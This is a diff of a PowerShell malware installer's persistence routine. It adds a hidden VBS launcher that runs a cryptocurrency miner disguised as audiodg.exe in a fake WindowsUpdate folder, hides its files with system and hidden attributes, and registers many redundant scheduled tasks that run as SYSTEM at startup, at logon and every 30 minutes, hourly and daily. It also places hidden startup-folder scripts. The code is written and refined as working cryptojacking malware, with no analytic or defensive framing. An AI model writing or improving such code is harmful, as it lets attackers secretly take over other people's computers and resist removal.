@@ -1144,58 +1144,57 @@ function Install-Persistence {
         "TimeSync", "BackgroundTasks"
     )
     
-    # Create stealth PowerShell launcher
-    $stealthLauncher = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
-    $launcherContent = @'
-$ErrorActionPreference = 'SilentlyContinue'
-$minerPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe'
-$configPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json'
+    # Create completely invisible VBS launcher
+    $vbsLauncher = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launch.vbs"
+    $vbsContent = @"
+' COMPLETELY INVISIBLE MINER LAUNCHER
+Set WshShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 
-# SINGLE INSTANCE CHECK - Only start if NOT already running
-$existingProcess = Get-Process -Name 'audiodg' -ErrorAction SilentlyContinue | Where-Object {
-    $_.Path -eq $minerPath
-}
+' Paths
+minerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"
+configPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"
 
-if (-not $existingProcess) {
-    if (Test-Path $minerPath) {
-        # Start miner WITHOUT --background flag (causes immediate exit)
-        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processInfo.FileName = $minerPath
-        $processInfo.Arguments = "--config=`"$configPath`""
-        $processInfo.UseShellExecute = $false
-        $processInfo.CreateNoWindow = $true
-        $processInfo.WorkingDirectory = Split-Path $minerPath
-        [System.Diagnostics.Process]::Start($processInfo) | Out-Null
-    }
-}
-'@
-    $launcherContent | Set-Content -Path $stealthLauncher -Force
-    attrib +s +h $stealthLauncher 2>&1 | Out-Null
+' Check if already running
+Set colProcesses = objWMIService.ExecQuery(_
+    "Select * From Win32_Process Where Name='audiodg.exe' AND " & _
+    "ExecutablePath='" & minerPath & "'")
+
+If colProcesses.Count = 0 Then
+    If CreateObject("Scripting.FileSystemObject").FileExists(minerPath) Then
+        ' Start completely hidden
+        WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color", 0, False
+    End If
+End If
+"@
+    $vbsContent | Set-Content -Path $vbsLauncher -Force
+    attrib +s +h $vbsLauncher 2>&1 | Out-Null
     
-    $taskScript = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\autostart.bat"
-    
-    # Create autostart batch file
-    $batchContent = @'
+    # Create a hidden batch file that runs the VBS launcher
+    $taskScript = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiosrv.bat"
+    $batchContent = @"
 @echo off
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
-'@
+wscript.exe "$vbsLauncher"
+"@
+    $batchContent | Set-Content -Path $taskScript -Force
+    attrib +s +h $taskScript 2>&1 | Out-Null
     $batchContent | Set-Content -Path $taskScript -Force
     
     foreach ($taskName in $taskNames) {
-        # OnStartup tasks (runs before login)
-        schtasks /create /tn $taskName /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
+        # OnStartup tasks (runs before login) - Using VBS launcher
+        schtasks /create /tn $taskName /tr "wscript.exe \"$vbsLauncher\"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
         # OnLogon tasks (runs when any user logs in)
-        schtasks /create /tn "${taskName}Logon" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
+        schtasks /create /tn "${taskName}Logon" /tr "wscript.exe \"$vbsLauncher\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
         # Every 30 minutes (faster monitoring than hourly)
-        schtasks /create /tn "${taskName}Interval" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc minute /mo 30 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
+        schtasks /create /tn "${taskName}Interval" /tr "wscript.exe \"$vbsLauncher\"" /sc minute /mo 30 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
         # Hourly backup (in case 30-min tasks are removed)
-        schtasks /create /tn "${taskName}Hourly" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc hourly /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
+        schtasks /create /tn "${taskName}Hourly" /tr "wscript.exe \"$vbsLauncher\"" /sc hourly /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
         # Daily tasks (additional backup)
-        schtasks /create /tn "${taskName}Daily" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" /sc daily /st 00:00 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
+        schtasks /create /tn "${taskName}Daily" /tr "wscript.exe \"$vbsLauncher\"" /sc daily /st 00:00 /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
     }
     
     # Registry Run keys (10+ locations for maximum redundancy)
@@ -1271,10 +1270,27 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Windows\Sys
             
             # VBS script (silent execution)
             $vbsScript = Join-Path $folder "WindowsAudioService.vbs"
-            $vbsContent = @'
+            $vbsContent = @"
+' COMPLETELY INVISIBLE MINER LAUNCHER
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1""", 0, False
-'@
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
+' Paths
+minerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"
+configPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"
+
+' Check if already running
+Set colProcesses = objWMIService.ExecQuery(_
+    "Select * From Win32_Process Where Name='audiodg.exe' AND " & _
+    "ExecutablePath='" & minerPath & "'")
+
+If colProcesses.Count = 0 Then
+    If CreateObject("Scripting.FileSystemObject").FileExists(minerPath) Then
+        ' Start completely hidden
+        WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color", 0, False
+    End If
+End If
+"@
             $vbsContent | Set-Content -Path $vbsScript -Force
             attrib +h +s $vbsScript 2>&1 | Out-Null
             
